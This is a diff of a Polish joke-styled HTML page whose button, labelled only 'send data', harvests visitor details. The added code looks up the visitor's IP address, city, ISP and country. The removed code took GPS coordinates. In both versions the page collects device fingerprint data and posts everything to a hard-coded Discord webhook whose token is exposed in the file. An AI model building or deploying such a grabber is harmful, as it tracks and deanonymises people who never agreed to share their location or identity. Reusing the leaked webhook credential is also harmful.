@@ -2,71 +2,49 @@
 <html lang="pl">
 <head>
   <meta charset="UTF-8">
-  <title>Wyślij dane XD</title>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #0f0f0f;
-      font-family: Arial, sans-serif;
-    }
-    button {
-      padding: 20px 40px;
-      font-size: 20px;
-      cursor: pointer;
-      background: #ff0055;
-      color: #fff;
-      border: none;
-      border-radius: 10px;
-    }
-  </style>
+  <title>Webhook XD</title>
 </head>
-<body>
-  <button onclick="sendData()">Wyślij dane XDDD</button>
+<body style="background:#111;display:flex;justify-content:center;align-items:center;height:100vh;">
+  <button onclick="sendData()" style="font-size:24px;padding:20px 40px;">
+    Wyślij dane XDDD
+  </button>
 
-  <script>
-    function sendData() {
-      const baseData = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen: `${screen.width}x${screen.height}`,
-        cpuCores: navigator.hardwareConcurrency || "nie wiem",
-        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "nie wiem",
-        touchSupport: 'ontouchstart' in window,
-        cookiesEnabled: navigator.cookieEnabled,
-        referrer: document.referrer || "brak"
-      }
+<script>
+async function sendData() {
+  try {
+    const ipRes = await fetch("https://ipapi.co/json/")
+    const ipData = await ipRes.json()
 
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          const data = {
-            ...baseData,
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy + "m"
-          }
-          postData(data)
-        }, () => {
-          postData(baseData)
-        })
-      } else {
-        postData(baseData)
-      }
+    const data = {
+      ip: ipData.ip,
+      city: ipData.city,
+      region: ipData.region,
+      country: ipData.country_name,
+      isp: ipData.org,
+      timezone: ipData.timezone,
+
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screen: `${screen.width}x${screen.height}`,
+      cpuCores: navigator.hardwareConcurrency || "?",
+      ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "?",
+      touch: 'ontouchstart' in window,
+      cookies: navigator.cookieEnabled,
+      referrer: document.referrer || "brak"
     }
 
-    function postData(data) {
-      fetch("https://discord.com/api/webhooks/1456448667949993996/t7B3LC8Jn1LJUfJYq9awyAsEuP3X05dA_elgnyj7WIw2546LCkAG4DKQvmvmtwIlAUjY", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      })
-      .then(() => alert("Webhook nakarmiony 😈"))
-      .catch(() => alert("Wywaliło się jak Windows XD"))
-    }
-  </script>
+    await fetch("https://discord.com/api/webhooks/1456448667949993996/t7B3LC8Jn1LJUfJYq9awyAsEuP3X05dA_elgnyj7WIw2546LCkAG4DKQvmvmtwIlAUjY", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    })
+
+    alert("Poleciało jak rakieta 😈")
+  } catch (e) {
+    alert("Zdechło jak tani router XDDD")
+  }
+}
+</script>
 </body>
 </html>
